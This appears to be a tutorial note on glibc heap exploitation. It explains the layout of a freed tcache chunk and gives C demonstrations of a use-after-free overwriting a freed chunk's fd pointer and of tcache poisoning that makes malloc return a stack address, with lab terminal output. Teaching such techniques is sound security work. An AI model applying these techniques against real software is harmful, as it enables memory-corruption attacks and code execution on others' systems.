## The Structure of a Freed Chunk

* The first 8 bytes = `fd`
* The second 8 bytes = `key` (used to detect double free)

<br>

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

typedef struct {
        char owner[8];
        unsigned long long int uuid;
        unsigned long long int size;
        char data[1];
} note_t;

int main() {
        intptr_t *n1 = malloc(sizeof(note_t));
        intptr_t *n2 = malloc(sizeof(note_t));

        free(n1);
        free(n2);

        printf("n2's fd: 0x%lx\n", (intptr_t) n2[0]);

        // We should have set n2 to NULL after freeing it,
        // now UAF will take place, and something bad will happen...
        strncpy(((note_t *) n2)->owner, "fuck", 8);
        printf("n2's fd: 0x%lx\n", (intptr_t) n2[0]);
}
```

<br>

Run this program, and we'll notice that `n2`'s fd pointer has been overwritten to `fuck`.
```
n2's fd: 0x563142eeb2a0
n2's fd: 0x6b637566
```

<br>

* Before `n2` is freed, the user has full control over the entire chunk.
* After `n2` is freed, the user (normally) shouldn't have access to `n2` anymore.
* This UAF bug gives user access to `n2` even `n2` has been freed, which can further contribute to tcache poisoning.

<br>

## tcache poisoning

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
        // disable buffering
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        size_t stack_var;
        printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

        printf("Allocating 2 buffers.\n");
        intptr_t *a = malloc(128);
        printf("malloc(128): %p\n", a);
        intptr_t *b = malloc(128);
        printf("malloc(128): %p\n", b);

        printf("Freeing the buffers...\n");
        free(a);
        free(b);

        printf("Now the tcache list has [ %p -> %p ].\n", b, a);
        printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
               "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
        b[0] = (intptr_t) &stack_var;

        printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

        printf("1st malloc(128): %p\n", malloc(128));
        printf("Now the tcache list has [ %p ].\n", &stack_var);

        intptr_t *c = malloc(128);
        printf("2nd malloc(128): %p\n", c);
        printf("We got the control\n");

        assert((long)&stack_var == (long)c);
        return 0;
}
```

<br>



```
n2's fd: 0x563142eeb2a0
n2's fd: 0x6b637566
root@67b89638f731:/home/tcachelab# ./out
The address we want malloc() to return is 0x7ffefab4ae08.
Allocating 2 buffers.
malloc(128): 0x565190d4b2a0
malloc(128): 0x565190d4b330
Freeing the buffers...
Now the tcache list has [ 0x565190d4b330 -> 0x565190d4b2a0 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x565190d4b330
to point to the location to control (0x7ffefab4ae08).
Now the tcache list has [ 0x565190d4b330 -> 0x7ffefab4ae08 ].
1st malloc(128): 0x565190d4b330
Now the tcache list has [ 0x7ffefab4ae08 ].
2nd malloc(128): 0x7ffefab4ae08
We got the control
```
